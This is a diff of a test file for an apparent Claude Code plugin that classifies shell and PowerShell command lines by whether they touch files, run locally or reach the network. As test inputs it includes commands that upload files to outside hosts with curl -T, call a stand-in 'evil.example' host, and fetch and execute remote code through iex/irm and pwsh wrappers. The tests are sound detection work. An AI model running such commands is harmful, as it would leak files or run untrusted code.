+  expect(stationOf('Get-ChildItem *.log | ForEach-Object { Get-Content $_ }', 'PowerShell')).toBe('files')
+  expect(stationOf('$h = @{ Uri = "https://x.io" }; Get-Content a.txt', 'PowerShell')).toBe('files')
+})
+
+test('an assignment after if, {, ! or do does not hide the command', () => {
+  for (const line of ['if GIT_TERMINAL_PROMPT=0 git fetch; then echo ok; fi', '{ X=1 curl https://evil.example; }', '! X=1 curl https://evil.example', 'for u in a; do X=1 curl https://evil.example; done', 'while X=1 curl -s https://evil.example; do sleep 1; done']) {
+    expect(`${line}: ${stationOf(line)}`).toBe(`${line}: web`)
+  }
+  expect(stationOf('if X=1 ls; then cat f; fi')).toBe('files')
+})
+
+test('>| is a redirection, not a pipe', () => {
+  // With no description the label is the command's name, and the file's name is not the command.
+  expect(classify('Bash', { command: '>|SECRET123 make' }, STRANGER)).toMatchObject({ station: 'shell', label: 'make' })
+  expect(classify('Bash', { command: 'make >| build.log' }, STRANGER)).toMatchObject({ station: 'shell', label: 'make' })
+  expect(stationOf('cat a.txt >| b.txt')).toBe('files')
+  expect(stationOf('echo x >| out.txt; curl -s https://x.io')).toBe('web')
+  // A pipe after a file's name is still a pipe.
+  expect(stationOf('cat a.txt > b.txt | curl -T - https://x.io')).toBe('web')
+})
+
+test('here-document marks cost no more than the line read, however many stand on it', () => {
+  const few = 'cat <<A '.repeat(1000) // 8,000 characters, as many as are read
+  const many = 'cat <<A '.repeat(50_000) // 400,000 characters
+  for (let i = 0; i < 3; i++) stationOf(few)
+  const t0 = performance.now()
+  stationOf(few)
+  const fewMs = performance.now() - t0
+  const t1 = performance.now()
+  stationOf(many)
+  stationOf(`${'x=$((a << b)); '.repeat(20_000)}curl x`)
+  stationOf(`${'cat <<A; '.repeat(20_000)}`)
+  const manyMs = performance.now() - t1
+  // Before: 8,000 characters took half a second through the mod, 48,000 six seconds, and four times as long for twice as many.
+  console.log(`COST naming 1,000 here-document marks on a line: ${fewMs.toFixed(1)} ms; three lines of 180,000 to 400,000 characters of them: ${manyMs.toFixed(1)} ms`)
+  expect(fewMs).toBeLessThan(300)
+  expect(manyMs).toBeLessThan(600)
+})
+
 test('a here-document handed to a shell is that shell\'s script', () => {
   for (const c of ['bash <<EOF\ncurl x\nEOF', "bash -s <<'EOF'\nset -e\nwget y\nEOF", 'sudo sh <<EOF\napt-get update\nEOF', 'echo start && zsh <<-EOF\n\tgit push\n\tEOF', 'bash <<EOF\necho hi']) {
     if (c.endsWith('hi')) expect([c, stationOf(c)]).toEqual([c, 'shell'])
@@ -1547,26 +1959,66 @@ test('the command docker runs in a container is the command that counts', () => 
   }
 })
 
+test('a find inside a find is read once, however deep, and each of its commands still counts', () => {
+  // With an end, each `-exec` is one command; with none, it takes the rest of the line.
+  expect(stationOf('find . -name "*.ts" -exec grep -l x {} \\; -exec wc -l {} \\;')).toBe('files')
+  expect(stationOf('find . -exec grep -l x {} \\; -exec make {} \\;')).toBe('shell')
+  expect(stationOf('find . -exec grep -l x {} \\; -exec curl -T {} https://example.com \\;')).toBe('web')
+  expect(stationOf('find . -exec grep -l x {} + -exec curl -T {} https://example.com +')).toBe('web')
+  expect(stationOf('find a -exec find b -exec find c -exec ls {} \\; \\; \\;')).toBe('files')
+  expect(stationOf(`${'find . -exec '.repeat(6)}ls`)).toBe('files')
+  expect(stationOf(`${'find . -exec '.repeat(6)}make`)).toBe('shell')
+  expect(stationOf(`${'find . -exec '.repeat(6)}curl https://example.com/x`)).toBe('web')
+  expect(stationOf(`${'find . -exec '.repeat(40)}curl https://example.com/x`)).toBe('web')
+  // Nineteen deep took ten seconds, twice as long with each one more: every `-exec` read the whole rest again.
+  const deep = `${'find . -exec '.repeat(19)}ls`
+  for (let i = 0; i < 3; i++) stationOf(deep)
+  const t0 = performance.now()
+  stationOf(deep)
+  stationOf(`${'find . -exec '.repeat(600)}ls`)
+  const ms = performance.now() - t0
+  console.log(`COST naming a find nineteen deep and one six hundred deep: ${ms.toFixed(1)} ms`)
+  expect(ms).toBeLessThan(300)
+})
+
+test('a line that runs more commands inside others than are followed is Shell, and what was found before still shows', () => {
+  // More than 256 commands behind other commands: the reading stops, and the line is not called Files.
+  expect(stationOf(`${'find . -exec '.repeat(200)}ls`)).toBe('files')
+  expect(stationOf(`${'find . -exec '.repeat(300)}ls`)).toBe('shell')
+  expect(stationOf(`${'sh -c ls; '.repeat(300)}`)).toBe('shell')
+  expect(stationOf(`curl https://example.com/x; ${'sh -c ls; '.repeat(300)}`)).toBe('web')
+  const t0 = performance.now()
+  stationOf(`${'sh -c "sh -c \\"sh -c ls\\""; '.repeat(250)}`)
+  expect(performance.now() - t0).toBeLessThan(300)
+})
+
 test('a command line is read up to a length, and a long one costs no more than that', () => {
-  // Past the first eight thousand characters nothing is read: the label and the station come from what stands before.
+  // Past the first eight thousand characters nothing is read: the label comes from what stands before, and the line
+  // is not called one about files alone, since what stands after is not known.
   const long = `ls ${'a'.repeat(9000)}; curl x`
-  expect(stationOf(long)).toBe('files')
+  expect(classify('Bash', { command: long }, STRANGER)).toEqual({ station: 'shell', label: 'ls' })
   expect(stationOf(`curl x; ls ${'a'.repeat(9000)}`)).toBe('web')
   const pipes = 'x|'.repeat(100_000)
+  // The middle one of five readings, against a budget several times what it takes: one reading in a full run has taken 140 ms on a busy runner.
+  const timed = (command: string): number => {
+    const times = Array.from({ length: 5 }, () => {
+      const t0 = performance.now()
+      stationOf(command)
+      return performance.now() - t0
+    })
+    return times.sort((a, b) => a - b)[2] ?? 0
+  }
   for (let i = 0; i < 3; i++) stationOf(pipes)
-  const t0 = performance.now()
-  stationOf(pipes)
-  const ms = performance.now() - t0
+  const ms = timed(pipes)
   console.log(`COST naming a 200,000-character line of pipes: ${ms.toFixed(1)} ms`)
-  expect(ms).toBeLessThan(100)
+  expect(ms).toBeLessThan(300)
   const doc = `cat <<EOF > f\n${'line of text here\n'.repeat(11_000)}EOF\ncurl x`
   for (let i = 0; i < 3; i++) stationOf(doc)
-  const t1 = performance.now()
   // The command after a long here-document is still seen.
   expect(stationOf(doc)).toBe('web')
-  const docMs = performance.now() - t1
+  const docMs = timed(doc)
   console.log(`COST naming a 200,000-character here-document: ${docMs.toFixed(1)} ms`)
-  expect(docMs).toBeLessThan(100)
+  expect(docMs).toBeLessThan(300)
 })
 
 test('more commands that reach the network are known by name or by subcommand', () => {
@@ -1574,7 +2026,7 @@ test('more commands that reach the network are known by name or by subcommand', 
     expect([c, stationOf(c)]).toEqual([c, 'web'])
   }
   // The same programs at work on what is already here stay on Shell.
-  for (const c of ['yarn build', 'git submodule status', 'git remote -v', 'terraform fmt', 'helm template .', 'openssl sha256 a.bin', 'deno run a.ts', 'svn status', 'bunx cowsay', 'npx cowsay']) {
+  for (const c of ['yarn build', 'git submodule status', 'git remote -v', 'terraform fmt', 'helm template .', 'openssl sha256 a.bin', 'deno run a.ts', 'svn status', 'pnpm exec tsc']) {
     expect([c, stationOf(c)]).toEqual([c, 'shell'])
   }
 })
@@ -1602,6 +2054,21 @@ test('guardedHooks is on unless switched off, in either spelling', () => {
   expect(setupFrom({ guardedHooks: 'nonsense' }).guardedHooks).toBe(true)
   expect(setupFrom({ guardedHooks: false }).guardedHooks).toBe(false)
   expect(setupFrom({ guardedHooks: 'false' }).guardedHooks).toBe(false)
+})
+
+test('every on-off option reads the same way: true or false, either as a word in a string, and anything else is its default', () => {
+  const ON = ['guardedHooks', 'openAtStart'] as const
+  const OFF = ['hookRecords', 'hookReasons', 'subagentNames', 'contextCost'] as const
+  for (const name of [...ON, ...OFF]) {
+    expect(setupFrom({ [name]: true })[name]).toBe(true)
+    expect(setupFrom({ [name]: 'true' })[name]).toBe(true)
+    expect(setupFrom({ [name]: false })[name]).toBe(false)
+    expect(setupFrom({ [name]: 'false' })[name]).toBe(false)
+  }
+  for (const odd of [undefined, null, '', 'yes', 'TRUE', 1, 0, []]) {
+    for (const name of ON) expect(setupFrom({ [name]: odd })[name]).toBe(true)
+    for (const name of OFF) expect(setupFrom({ [name]: odd })[name]).toBe(false)
+  }
 })
 
 test('with guardedHooks off a call a hook refused reads as failed, and no hook of the five leaves a row', { options: { ...OWN, guardedHooks: false } }, async ($, on) => {
@@ -1666,6 +2133,31 @@ test('with a surface attached at the start the pane is opened at once', async ($
 
   await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
   expect(opens).toBe(1)
+})
+
+test('with openAtStart off the pane opens on the command alone, and the map holds what came before', { options: { openAtStart: false } }, async ($, on) => {
+  let opens = 0
+  on('clock.now', () => ({ value: 1_000_000 }))
+  on('command.register', () => ({ value: { command: 'lot-map' } }))
+  on('session.surfaces', () => ({ value: ['desktop'] }) as never)
+  on('ui.open', () => {
+    opens++
+    return { value: { isPlaced: true } }
+  })
+  on('session.start', (_, e) => ({ cwd: e.cwd }))
+  on('session.attach', (_, e) => ({ clientId: e.clientId }) as never)
+  on('tool.call', () => ({ result: {} }))
+
+  await $.session.start({ cwd: '/', surface: 'desktop', isInteractive: true })
+  await $.session.attach({ clientId: 'c1', surface: 'desktop' } as never)
+  await $.tool.call({ tool: 'Read', file_path: '/a/b/kept.py' })
+  expect(opens).toBe(0)
+
+  expect((await $.command.run({ command: 'lot-map', args: '' } as never))?.text).toBe('Work map opened.')
+  expect(opens).toBe(1)
+  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
+  expect(await ui.find({ type: 'Text', text: /kept\.py/ })).toBeDefined()
+  await ui.unmount()
 })
 
 // A background call that keeps running, then calls enough that nothing folds: the board keeps 80.
@@ -1791,4 +2283,151 @@ test('foldRows marks a running call kept past the end as held, and no other row'
 test('logRows is fill or 16, whatever else was set', () => {
   expect(setupFrom({ logRows: 'fill' }).logRows).toBe('fill')
   for (const value of ['16', 16, '24', true, undefined]) expect(setupFrom({ logRows: value }).logRows).toBe(16)
+})
+
+test('a task id in the answer of a tool that starts no background task leaves no row running, and the board has an end', { timeoutMs: 60_000 }, async ($, on) => {
+  let now = 1_000_000
+  on('clock.now', () => ({ value: now++ }))
+  let last: unknown
+  on('state.set' as never, ((_: unknown, e: unknown, next: (e: unknown) => unknown) => ((last = e), next(e))) as never)
+  const board = (): Board | undefined => (last as { value?: { value?: Board } }).value?.value
+  let n = 0
+  on('tool.call', () => ({ result: { backgroundTaskId: `sk-ant-hunter2-${n++}` } }) as never)
+  // Any tool may answer with a field of this name: a server's own tool is no background task of Claude Code's.
+  for (let i = 0; i < 300; i++) await $.tool.call({ tool: 'mcp__notes__save', text: 'x' } as never)
+  expect(board()?.entries.length ?? 0).toBeLessThanOrEqual(80)
+  expect(board()?.entries.filter(e => e.status === 'run').length).toBe(0)
+  expect(JSON.stringify(board())).not.toContain('hunter2')
+  // The shell does start them, and each row stays open; but past a number of them the oldest go, so the board ends.
+  for (let i = 0; i < 300; i++) await $.tool.call({ tool: 'Bash', command: 'sleep 600', description: 'Wait', run_in_background: true } as never)
+  const entries = board()?.entries ?? []
+  expect(entries.length).toBeLessThanOrEqual(120)
+  expect(entries.filter(e => e.status === 'run' && e.task !== undefined).length).toBeGreaterThanOrEqual(40)
+  // The newest task is among those kept.
+  expect(entries.some(e => e.task === `sk-ant-hunter2-${n - 1}`)).toBe(true)
+})
+
+test('a line of brackets is read within the budget of a long line', () => {
+  for (const line of [`${'( '.repeat(2600)}${')'.repeat(2600)}`, `${'( '.repeat(2000)}${')'.repeat(4000)}`]) {
+    for (let i = 0; i < 10; i++) classify('Bash', { command: line }, STRANGER)
+    const took = Array.from({ length: 5 }, () => {
+      const t0 = performance.now()
+      classify('Bash', { command: line }, STRANGER)
+      return performance.now() - t0
+    }).sort((a, b) => a - b)
+    console.log(`COST naming a line of ${line.length} brackets: ${(took[2] ?? 0).toFixed(1)} ms`)
+    expect(took[2] ?? 0).toBeLessThan(20)
+  }
+  // A subshell's closing bracket still comes off its last word, and no more of them than were opened.
+  expect(classify('Bash', { command: '(cd sub; ls)' }, STRANGER).station).toBe('files')
+  expect(classify('Bash', { command: '((cd sub; curl https://x.io))' }, STRANGER).station).toBe('web')
+})
+
+test('a line with a memory command and a command that reaches the network goes to Network, as with commandStations', () => {
+  const setup = setupFrom({ memoryCommands: ['recall'], commandStations: ['mytool=files'] })
+  const at = (command: string, description = '') => classify('Bash', { command, description }, setup)
+  // Alone, the memory command is Memory.
+  expect(at('recall search x').station).toBe('memory')
+  expect(at('recall search x; ls; echo done').station).toBe('memory')
+  // With a command that reaches the network, before it, after it or inside another: Network, and the row keeps its label.
+  expect(at('recall search x; curl https://x.io')).toEqual({ station: 'web', label: 'recall' })
+  expect(at('curl -s https://x.io | recall add -', 'Save the page')).toEqual({ station: 'web', label: 'Save the page' })
+  expect(at('recall add "$(curl -s https://x.io)"').station).toBe('web')
+  expect(at('recall sync && git push').station).toBe('web')
+  // What a note says is text: the name of a command in it, in quotes, sends nothing.
+  expect(at('recall add "we used curl (and wget) today; git push later"').station).toBe('memory')
+  expect(at("recall add 'see $(curl x)'").station).toBe('memory')
+  // A memory command that is itself known to reach the network is the person's own choice, and stays Memory.
+  const own = setupFrom({ memoryCommands: ['gh'] })
+  expect(classify('Bash', { command: 'gh api notes' }, own).station).toBe('memory')
+  // The two options go by one rule now.
+  expect(at('mytool x; curl https://x.io').station).toBe('web')
+  // In PowerShell too.
+  expect(classify('PowerShell', { command: 'recall search x; Invoke-WebRequest https://x.io' }, setup).station).toBe('web')
+})
+
+test('a here-document in backticks ends with the backticks, and one with a bare mark runs what its text holds in $( ) and backticks', () => {
+  // The shell reads a here-document of a command in backticks only up to the closing backtick: closed on its line,
+  // it has no text, and the next line runs. Inside double quotes and outside them.
+  expect(stationOf('echo "`cat <<EOF`"\ncurl -s https://x.io\nEOF')).toBe('web')
+  expect(stationOf('x=`cat <<EOF`\ncurl -s https://x.io\nEOF')).toBe('web')
+  // One that goes on over the lines is text to its mark, as before.
+  expect(stationOf('x=`cat <<EOF\ncurl -s https://x.io\nEOF\n`; ls')).toBe('shell')
+  expect(stationOf('echo "`cat <<\'EOF\'\ncurl -s https://x.io\nEOF\n`"')).toBe('shell')
+  // For `$( )` the text is taken from the next lines even with the `)` on the same line: so the shell does.
+  expect(stationOf('x="$(cat <<EOF)"\ncurl -s https://x.io\nEOF')).not.toBe('web')
+
+  // A bare mark: the shell expands the text, and what stands in `$( )` or backticks runs.
+  expect(stationOf('cat > .env <<EOF\nTOKEN=$(curl -s https://x.io/token)\nEOF')).toBe('web')
+  expect(stationOf('cat <<EOF\n`curl https://x.io`\nEOF')).toBe('web')
+  expect(stationOf('cat > .env <<-EOF\n\tA=1\n\tTOKEN=$(echo "$(curl -s https://x.io)")\n\tEOF')).toBe('web')
+  expect(stationOf('x="$(cat <<EOF\nline $(curl -s https://x.io)\nEOF\n)"')).toBe('web')
+  // A quoted mark, or a backslash in it, makes the text plain; so does a backslash before the `$` or the backtick.
+  expect(stationOf("cat > .env <<'EOF'\nTOKEN=$(curl -s https://x.io/token)\nEOF")).toBe('files')
+  expect(stationOf('cat > .env <<\\EOF\nTOKEN=$(curl -s https://x.io/token)\nEOF')).toBe('files')
+  expect(stationOf('cat > .env <<EOF\nTOKEN=\\$(curl -s https://x.io/token)\nEOF')).toBe('files')
+  // Arithmetic runs nothing, a command about files keeps the line on Files, and the rest of the text is not read.
+  expect(stationOf('cat > f <<EOF\nsum $((1 + 2)), curl x; wget y\nEOF')).toBe('files')
+  expect(stationOf('cat > f <<EOF\n$(cat other.txt)\nEOF')).toBe('files')
+  expect(stationOf('cat > f <<EOF\nBuilt on $(date)\nEOF')).toBe('shell')
+  // The label is still the line's own first command.
+  expect(classify('Bash', { command: 'cat > .env <<EOF\nTOKEN=$(curl -s https://x.io/token)\nEOF' }, STRANGER).label).toBe('cat')
+})
+
+// An outside audit of 0.14.0: six findings, and the lines found beside them.
+test('in the text of a here-document a bracket inside quotes closes no `$( )`, and a `$( )` may run over lines', () => {
+  expect(classify('Bash', { command: "cat <<EOF > out.txt\n$(printf ')'; curl -s https://example.com)\nEOF" }, STRANGER)).toEqual({ station: 'web', label: 'cat' })
+  for (const text of ['$(printf ")"; curl -s https://x.io)', '$(echo "a $(printf \')\') b)"; curl https://x.io)', '$(printf x;\ncurl -s https://x.io)', 'a `printf x\ncurl https://x.io` b', '$(case x in a) true;; esac; curl https://x.io)']) {
+    expect([text, stationOf(`cat > f <<EOF\n${text}\nEOF`)]).toEqual([text, 'web'])
+  }
+  // What only looks like one stays text, and a document that runs nothing on the network stays where it was.
+  for (const text of ['\\$(curl https://x.io) is not run', '$(( 1 + 2 )) curl https://x.io', '$(cat ")" other.txt)\ncurl https://x.io']) {
+    expect([text, stationOf(`cat > f <<EOF\n${text}\nEOF`)]).toEqual([text, 'files'])
+  }
+})
+
+test('env -S runs the line it is handed: the command in it is the one that counts', () => {
+  for (const c of ["env -S 'curl https://example.com'", 'env -S "curl https://example.com"', "env --split-string='curl https://example.com'", "env -S'curl https://example.com'", "env -i -S 'A=1 curl https://example.com'", "env -iS 'curl x'", "sudo env -u HOME -S 'wget x'"]) {
+    expect([c, stationOf(c)]).toEqual([c, 'web'])
+  }
+  expect(classify('Bash', { command: "env -S 'curl https://example.com'" }, STRANGER)).toEqual({ station: 'web', label: 'env' })
+  for (const c of ["env -S 'ls -la'", "env -S 'cat a.txt' b.txt"]) expect([c, stationOf(c)]).toEqual([c, 'files'])
+})
+
+test('a line handed to PowerShell or to cmd as a text is read for what it runs', () => {
+  const ps = (command: string) => classify('PowerShell', { command }, STRANGER)
+  expect(ps('Invoke-Expression "Invoke-RestMethod https://example.com"')).toEqual({ station: 'web', label: 'Invoke-Expression' })
+  for (const c of ["iex 'irm https://example.com'", "Invoke-Expression -Command 'Invoke-WebRequest https://example.com'", "iex 'gci; irm https://x.io'", 'Invoke-Expression -Command:"irm https://x.io"', "pwsh -Command 'irm https://example.com'", 'powershell -NoProfile -c "irm https://example.com"', 'pwsh -c irm https://example.com', 'powershell.exe -Command "iex \'irm https://x.io\'"', 'cmd /c curl https://example.com', 'cmd.exe /C "curl https://example.com"']) {
+    expect([c, ps(c).station]).toEqual([c, 'web'])
+  }
+  // From Bash the same shells are read the same way.
+  for (const c of ["pwsh -Command 'irm https://example.com'", "pwsh -NoLogo -c 'Invoke-WebRequest https://x.io'", 'cmd /c curl https://example.com']) {
+    expect([c, stationOf(c)]).toEqual([c, 'web'])
+  }
+  expect(classify('Bash', { command: "pwsh -Command 'irm https://example.com'" }, STRANGER).label).toBe('pwsh')
+  // A line that reaches nothing stays where it was, and so does a script named, not handed over.
+  for (const c of ["iex 'Get-Date'", 'iex $line', "pwsh -Command 'Get-Date'", 'pwsh -File deploy.ps1', 'cmd /c dir']) {
+    expect([c, ps(c).station]).toEqual([c, 'shell'])
+  }
+})
+
+test('Claude Code fetching a plugin, a marketplace or itself is on Network', () => {
+  for (const c of ['claude plugin marketplace update lot-map', 'claude plugin marketplace add alexeyw/lot-map', 'claude plugin install lot-map@lot-map', 'claude plugin update lot-map@lot-map', 'claude update', 'claude install']) {
+    expect([c, classify('Bash', { command: c }, STRANGER)]).toEqual([c, { station: 'web', label: 'claude' }])
+  }
+  for (const c of ['claude plugin validate .', 'claude plugin test .', 'claude plugin marketplace list', 'claude plugin list', 'claude --version']) {
+    expect([c, stationOf(c)]).toEqual([c, 'shell'])
+  }
+})
+
+test('a command that runs a package by its name may fetch it, and is on Network', () => {
+  for (const c of ['bunx cowsay', 'npx cowsay', 'npx tsc', 'npm exec cowsay', 'npm x cowsay', 'bun x cowsay', 'uvx ruff', 'uv tool run ruff', 'go run golang.org/x/tools/cmd/stringer@latest', 'deno run https://x.io/a.ts', 'deno run -A npm:cowsay', 'deno run jsr:@std/http/file-server']) {
+    expect([c, stationOf(c)]).toEqual([c, 'web'])
+  }
+  expect(classify('Bash', { command: 'bunx cowsay' }, STRANGER).label).toBe('bunx')
+  expect(classify('Bash', { command: 'uvx ruff' }, STRANGER).label).toBe('uvx')
+  // Told not to fetch, or given what is here already, they stay on Shell.
+  for (const c of ['npx --no-install cowsay', 'npx --no cowsay', 'bunx --no-install cowsay', 'go run .', 'go run ./cmd/tool', 'deno run a.ts', 'pnpm exec tsc', 'bun run build']) {
+    expect([c, stationOf(c)]).toEqual([c, 'shell'])
+  }
 })
